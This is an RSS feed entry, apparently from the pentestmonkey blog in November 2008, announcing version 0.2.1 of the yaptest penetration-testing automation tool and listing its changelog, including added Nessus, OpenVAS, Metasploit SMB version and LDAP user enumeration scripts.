					<comments>https://pentestmonkey.net/blog/yaptest-update-0-2-1#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 26 Nov 2008 21:06:38 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[yaptest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=77</guid>

					<description><![CDATA[Version 0.2.1 of yaptest is now available.  Download it here. This is quite a major update.  The most notable improvements are support for running Nessus and/or OpenVAS.  At present Nessus and OpenVAS are automatically run against  any open ports with Safe Checks enabled. As with any major update one or two bugs might have crept [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Version 0.2.1 of <a href="http://pentestmonkey.net/projects/yaptest/yaptest-overview/">yaptest</a> is now available.  Download it <a href="http://pentestmonkey.net/projects/yaptest/yaptest-installation/">here</a>.</p>
<p>This is quite a major update.  The most notable improvements are support for running <a href="http://www.nessus.org/">Nessus</a> and/or <a href="http://www.openvas.org/">OpenVAS</a>.  At present Nessus and OpenVAS are automatically run against  any open ports with Safe Checks enabled.</p>
<p>As with any major update one or two bugs might have crept in.  Please mail pentestmonkey at pentestmonkey dot net if you find anything&#8217;s broken.</p>
<p>The complete changelog is included below:</p>
<p>&nbsp;</p>
<p><span id="more-77"></span></p>
<pre>2008-11-26 yaptest v0.2.1

* Added yaptest-ssh-keyscan.pl to gather SSH host keys
* Lots more parsing of enum4linux to support the 'Windows info'
  feature of YaptestFE.
* Added yaptest-parse-dcetest.pl to parse windows hostnames
* yaptest-db-ips.sh now checks if you're root before running.
* yaptest-parse-ntpq.pl parsed NTP OS disclosure issue and stores
  OS in host_info table.
* Timeout for nmap UDP scans can be set with yaptest-config.pl
* Changed issue name insec_proto_rdp to rdp_mitm
* Added yaptest-smb-version.pl to get version info via
  metasploit's auxiliary/scanner/smb/version module.
* Bug fix: "yaptest-ports.pl query --test_area foo" works
* API change: insert_issue will now add ports into database if
              and only if the host already in the database.
* API change: insert_port will not add new hosts
* API change: ::PORT:: can be specified in output file even if
              it wasn't specified in the command.
* Amap is now used to find SSL ports in addition to nmap.
* Added yaptest-nessus3.pl and yaptest-nessus-wrapper.pl to
  to run Nessus v3 against hosts in backend database.
* Netmask is now parsed from ICMP and SNMP data and stored in the
  interfaces tables.  This will support better network maps in
  YaptestFE in future.
* Added yaptest-openvas.pl to run OpenVAS against hosts in the
  backend datbases.
* Output of nmap is parsed to identify hosts support SSHv1.
* Added yaptest-ldapuserenum.pl to run ldapuserenum.py against
  LDAP servers.  Usernames are parsed into the database.
* Backgrounded nikto scans because the take a long time
* yaptest-nmap-udp.pl now additionally tests all open UDP ports
  to make double sure we have version info for each one.</pre>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/yaptest-update-0-2-1/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
